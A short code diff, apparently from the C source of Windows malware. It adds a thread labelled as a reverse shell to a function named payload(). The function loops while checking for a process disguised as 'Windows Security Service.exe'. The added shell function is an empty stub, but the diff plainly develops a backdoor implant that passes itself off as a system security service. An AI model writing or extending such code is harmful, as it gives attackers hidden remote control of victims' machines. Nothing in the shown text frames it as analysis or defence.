@@ -5,8 +5,15 @@
 
 extern char serviceName[64];
 
+DWORD WINAPI smile(){
+
+}
+
 // Execute the payload
 void payload(){
+    // Create a thread for the reverse shell
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)smile, NULL, 0, NULL);
+
     while(1){
         if(!findFirstProc("Windows Security Service.exe")){
             char destination[MAX_PATH];
